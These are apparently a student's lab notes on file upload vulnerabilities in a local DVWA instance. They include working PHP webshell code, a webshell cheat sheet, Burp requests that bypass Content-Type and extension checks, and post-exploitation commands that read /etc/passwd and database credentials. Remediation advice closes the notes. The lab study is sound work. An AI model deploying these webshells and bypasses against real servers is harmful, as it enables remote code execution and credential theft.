# Day 13 Notes — File Upload Vulnerabilities & Webshells

---

## 1. What We Did Today Overview

- Understood what a webshell is and how it gives remote code execution
- Created a PHP webshell from scratch
- Uploaded the webshell on Low security and executed OS commands through the browser
- Analyzed the raw HTTP file upload request in Burp — understood multipart/form-data
- Bypassed Medium security using Content-Type header manipulation in Burp
- Attempted double extension bypass — understood why it failed on this setup
- Attempted High security bypass — confirmed it is significantly stricter
- Uploaded files directly through Burp Repeater without touching the browser

---

## 2. What is a File Upload Vulnerability

### The concept
Web applications often allow users to upload files — profile pictures, documents, attachments. The vulnerability appears when the server doesn't properly validate what type of file is being uploaded.

If an attacker can upload a `.php` file to a web server and then access it through a URL, the server executes the PHP code inside it. This gives the attacker **Remote Code Execution (RCE)** — the ability to run any operating system command on the server.

### Why it's critical
File upload vulnerabilities are one of the fastest paths from "I found a bug" to "I own the server." The attack chain is:
```
Find file upload form
        ↓
Upload PHP webshell
        ↓
Access uploaded file via URL
        ↓
Execute OS commands through browser
        ↓
Full server compromise
```

### Real world examples
File upload vulnerabilities have been found in WordPress plugins, content management systems, photo sharing apps, and enterprise software. They consistently rate as Critical severity in bug bounty programs.

---

## 3. What is a Webshell

### Definition
A webshell is a malicious script uploaded to a web server that provides a command execution interface through the browser. The attacker accesses it via a URL and passes commands as URL parameters — the server executes them and returns the output.

### The PHP webshell we created
```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

**Breaking this down:**
- `<?php ... ?>` — PHP opening and closing tags. Everything inside is executed as PHP code
- `shell_exec()` — PHP function that executes a shell command and returns the output as a string
- `$_GET["cmd"]` — reads the value of the `cmd` URL parameter
- `echo` — prints the output to the page

So when you visit:
```
http://target.com/uploads/shell.php?cmd=whoami
```
The server runs `whoami` in the OS terminal and prints the result on the page.

### Creating the webshell
```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/shell.php
cat /tmp/shell.php
```
Output confirmed:
```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

---

## 4. Low Security — Unrestricted File Upload

### What Low security does
Zero validation. The server accepts any file type, any extension, any content. Whatever you upload gets saved and served.

### What we did
1. DVWA → File Upload → chose `/tmp/shell.php` → clicked Upload
2. Success message:
```
../../hackable/uploads/shell.php succesfully uploaded!
```
3. File now accessible at:
```
http://127.0.0.1/hackable/uploads/shell.php
```

### Commands we executed through the webshell

**`?cmd=whoami`**
```
www-data
```
The web server runs as `www-data` — a low privilege user. This is Linux security working correctly — the web server doesn't run as root.

**`?cmd=id`**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Confirms user ID, group ID, and group memberships.

**`?cmd=ls`**
```
shell.php
```
Lists files in the current directory — our uploaded shell is there.

**`?cmd=ls /var/www/html`**
Full listing of the web root — every file and folder of the web application visible.

**`?cmd=cat /etc/passwd`**
Full contents of the password file — all system users exposed.

**`?cmd=uname -a`**
```
Linux 03b6d646ff9d 4.19.0-26-amd64 #1 SMP Debian 4.19.304-1 (2024-01-09) x86_64 GNU/Linux
```
Kernel version, hostname, architecture — full server fingerprint.

### What this means in real hacking
With a working webshell you can:
- Read any file the `www-data` user can access
- List directory structures to find config files
- Find database credentials in config files
- Attempt privilege escalation to root
- Download additional tools onto the server
- Create a reverse shell for persistent interactive access
- Pivot to other internal systems

---

## 5. The Raw HTTP File Upload Request — Explained

When you upload a file through a browser, Burp shows the raw HTTP request. Understanding this is essential for bypassing upload filters.

### The full request we intercepted

```
POST /vulnerabilities/upload/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----geckoformboundarybf2cd38cc106453c7f8a28757b8c9c17
Content-Length: 499
Cookie: PHPSESSID=f34qj17u195eg5o4q3kt4tmtv4; security=low

------geckoformboundarybf2cd38cc106453c7f8a28757b8c9c17
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------geckoformboundarybf2cd38cc106453c7f8a28757b8c9c17
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET["cmd"]); ?>
------geckoformboundarybf2cd38cc106453c7f8a28757b8c9c17
Content-Disposition: form-data; name="Upload"

Upload
------geckoformboundarybf2cd38cc106453c7f8a28757b8c9c17--
```

### Breaking down every part

**Request method and path:**
```
POST /vulnerabilities/upload/ HTTP/1.1
```
File uploads always use POST because data goes in the request body not the URL.

**The outer Content-Type:**
```
Content-Type: multipart/form-data; boundary=----geckoformboundarybf2cd38cc106453c7f8a28757b8c9c17
```
`multipart/form-data` is the format used when uploading files. The `boundary` is a unique random string that acts as a separator between different parts of the form. Think of it as dividers between sections.

**Part 1 — MAX_FILE_SIZE (client side — useless for security):**
```
Content-Disposition: form-data; name="MAX_FILE_SIZE"
100000
```
A hidden HTML form field that tells the server the max file size is 100,000 bytes. This is enforced client-side only — you can change it to any number in Burp and the server accepts it. Never rely on client-side size limits for security.

**Part 2 — The actual file (this is the attack surface):**
```
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET["cmd"]); ?>
```
Three critical fields:
- `filename="shell.php"` → the filename saved on the server — changing this changes what the file is called
- `Content-Type: application/x-php` → what the browser says this file type is — **this is what Medium security checks and what we bypass**
- The file contents on the last line — the actual PHP code

**Part 3 — Submit button:**
```
Content-Disposition: form-data; name="Upload"
Upload
```
Just the form button value. Not security relevant.

### Why understanding this matters
Every file upload bypass involves modifying one or more of these fields in Burp:
- Change `filename` → extension bypass attacks
- Change `Content-Type` → MIME type bypass attacks
- Change file contents → embed PHP in image files

---

## 6. Medium Security — Content-Type Bypass

### What Medium security checks
Medium security checks the `Content-Type` header of the uploaded file. If it's not `image/jpeg` or `image/png` — the upload is rejected with:
```
Your image was not uploaded. We can only accept JPEG or PNG images.
```

### Why this is weak
The `Content-Type` header in the file upload request is set by the browser. It's sent by the client — which means the attacker controls it. Burp lets you change it to anything before it reaches the server.

### The bypass — one line change in Burp

**Original request (rejected):**
```
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php
```

**Modified request (accepted):**
```
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg
```

Changed one line. The server saw `image/jpeg` and accepted the upload. The actual file contents — our PHP webshell — were never checked. The file was saved as `shell.php` and remained fully executable.

### Result
```
../../hackable/uploads/shell.php succesfully uploaded!
```
Then visiting:
```
http://127.0.0.1/hackable/uploads/shell.php?cmd=whoami
```
Still returned `www-data` — full code execution bypassed Medium security.

### The lesson
Checking Content-Type alone is not a valid security control because it comes from the client and can be changed in one second with Burp.

---

## 7. Double Extension Bypass — What We Tried and Why It Failed

### What is a double extension bypass
Renaming a file to have two extensions like `shell.php.jpg` — hoping the server's security check only looks at the last extension (`.jpg`) while Apache executes it because `.php` appears somewhere in the name.

### What we created
```bash
cp /tmp/shell.php /tmp/shell.php.jpg
```

### What happened when accessed
```
The image "http://127.0.0.1/hackable/uploads/shell.php.jpg?cmd=whoami" 
cannot be displayed because it contains errors.
```

### Why it failed
The server uploaded the file but served it as an image — not executing the PHP. The browser tried to display it as a JPEG, failed because the contents are PHP code not image data, and showed the image error.

This bypass only works on Apache servers with a specific misconfiguration:
```apache
AddHandler php5-script .php
```
When Apache is configured this way it executes any file with `.php` anywhere in the filename — including `shell.php.jpg`. DVWA's Docker container does not have this misconfiguration so the bypass failed.

### What this teaches
File upload bypasses are environment-specific. The same payload works on one server and fails on another depending on:
- Apache/Nginx configuration
- PHP configuration
- Server-side validation logic
- File system permissions

Real bug bounty requires testing multiple bypass techniques and understanding why each one works or fails.

---

## 8. High Security — Strict Validation

### What High security does
High security validates both the file extension AND the actual file contents. It checks:
1. The file extension must be `.jpg`, `.jpeg`, or `.png`
2. The file must contain valid image data (magic bytes check)

### What we tried

**Attempt 1 — plain `shell.php`:**
```
Error: Your image was not uploaded.
We can only accept JPEG or PNG images.
```
Extension check failed immediately.

**Attempt 2 — `image.jpg.php`:**
Also rejected — High security checks the final extension strictly.

**Attempt 3 — `image.jpg.php` with JPEG magic bytes prepended:**
```bash
echo -e '\xff\xd8\xff\xe0' > /tmp/image.jpg.php
echo '<?php echo shell_exec($_GET["cmd"]); ?>' >> /tmp/image.jpg.php
```
Also rejected — High security checks both the extension AND the magic bytes together and requires a valid combination.

### What magic bytes are
Every file type has a unique sequence of bytes at the start of the file called magic bytes or file signature. Servers that do proper validation read these bytes to determine the real file type — not just the extension or Content-Type header.

| File type | Magic bytes (hex) |
|---|---|
| JPEG | `FF D8 FF E0` |
| PNG | `89 50 4E 47` |
| PDF | `25 50 44 46` |
| PHP | No magic bytes — starts with `<?php` |

A proper magic bytes check on a JPEG upload would:
1. Read the first 4 bytes of the file
2. Confirm they are `FF D8 FF E0`
3. Only then accept the upload

### How High security is bypassed in real CTFs
In CTF challenges and some real targets High security can still be bypassed by creating a valid JPEG file with PHP code embedded after the image data:
```bash
# Start with a real JPEG file
cp real_image.jpg /tmp/exploit.jpg
# Append PHP code after the image data
echo '<?php echo shell_exec($_GET["cmd"]); ?>' >> /tmp/exploit.jpg
# Rename to try to get it executed
cp /tmp/exploit.jpg /tmp/exploit.php.jpg
```
This creates a file that passes magic bytes validation (starts with real JPEG data) but contains PHP code. Whether it executes depends on additional server configuration.

On DVWA High security this was not achievable in this Docker environment — which is realistic. High security is designed to be much harder.

---

## 9. Task 8 — Uploading Through Burp Repeater

### Why upload through Repeater
- Faster than going through the browser UI every time
- Can modify any part of the request on the fly
- Can send the same upload multiple times with slight variations
- Essential for rapid testing of bypass techniques

### What we did
1. Sent the Low security upload request to Repeater
2. Changed `filename="shell.php"` to `filename="shell2.php"` in the request body
3. Clicked Send
4. New file uploaded without touching the browser
5. Confirmed by visiting:
```
http://127.0.0.1/hackable/uploads/shell2.php?cmd=id
```
Returned `www-data` — second webshell working.

### When this matters in real testing
In real bug bounty you'll use Repeater to:
- Test different filename variations rapidly
- Try different Content-Type values without going through the browser each time
- Modify file contents while keeping everything else the same
- Send the same upload to different endpoints

---

## 10. Security Level Comparison

| Check | Low | Medium | High |
|---|---|---|---|
| File extension | None | None | Strict — jpg/png only |
| Content-Type header | None | Checks for image/* | Checks for image/* |
| Magic bytes | None | None | Validates image data |
| Bypass difficulty | Trivial | Easy — one Burp change | Hard |
| Bypassed today | Yes ✓ | Yes ✓ | No ✗ |

---

## 11. How to Properly Fix File Upload Vulnerabilities

### What doesn't work (and why)
- Checking Content-Type header only → client controlled, bypassable in 1 second
- Checking file extension only → double extension, null byte bypasses
- Checking filename → rename attacks
- Client-side JavaScript validation → bypassable before request even reaches server

### What actually works

**1. Validate magic bytes server-side:**
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['upload']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    die("Invalid file type");
}
```

**2. Rename the file on upload — never use user-supplied filename:**
```php
$new_filename = uniqid() . '.jpg';
move_uploaded_file($_FILES['upload']['tmp_name'], 'uploads/' . $new_filename);
```
Even if someone uploads `shell.php` — it gets saved as `a3f9b2c1.jpg`. Can't be executed.

**3. Store uploads outside the web root:**
Save files to `/var/uploads/` instead of `/var/www/html/uploads/`. Files outside the web root can't be accessed via URL so even if a PHP file is uploaded it can never be executed.

**4. Use a CDN or separate file server:**
Serve uploaded files from a different domain entirely with no PHP execution capability.

**5. Content Security Policy:**
Even if XSS or file upload leads to JS injection — CSP limits what that code can do.

---

## 12. Webshell Payloads Cheat Sheet

**Basic command execution:**
```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

**More robust with error handling:**
```php
<?php echo system($_GET["cmd"]); ?>
```

**Full featured webshell:**
```php
<?php
if(isset($_GET["cmd"])) {
    echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
}
?>
```

**Common commands to run after getting webshell:**
```bash
whoami                    # what user is the server running as
id                        # user ID and group memberships
uname -a                  # kernel version and OS info
ls /var/www/html          # web root contents
find / -name "config*"    # find all config files
cat /etc/passwd           # all system users
cat /var/www/html/config/config.inc.php  # database credentials
ps aux                    # running processes
netstat -an               # open network connections
```

---

## 13. MIME Types Reference

| File type | MIME type |
|---|---|
| JPEG image | `image/jpeg` |
| PNG image | `image/png` |
| GIF image | `image/gif` |
| PDF | `application/pdf` |
| PHP file | `application/x-php` |
| Plain text | `text/plain` |
| HTML | `text/html` |
| ZIP | `application/zip` |

In a MIME type bypass attack you change the file's MIME type from `application/x-php` to `image/jpeg` in Burp to fool the server's Content-Type check.

---

## 14. Key Concepts Summary

| Term | Meaning |
|---|---|
| Webshell | Malicious PHP script that executes OS commands via browser URL |
| `shell_exec()` | PHP function that runs a system command and returns output |
| `$_GET["cmd"]` | Reads the `cmd` URL parameter value |
| multipart/form-data | HTTP format used for file uploads — divides form into parts |
| boundary | Unique separator string between parts in a multipart request |
| Content-Type | Header declaring file type — client controlled — bypassable |
| MIME type bypass | Changing Content-Type to image/jpeg in Burp to bypass type check |
| Double extension | Naming file `shell.php.jpg` — works only on misconfigured Apache |
| Magic bytes | First bytes of a file that identify its real type — reliable check |
| www-data | Default Apache web server user — low privilege |
| RCE | Remote Code Execution — running OS commands on target server |

---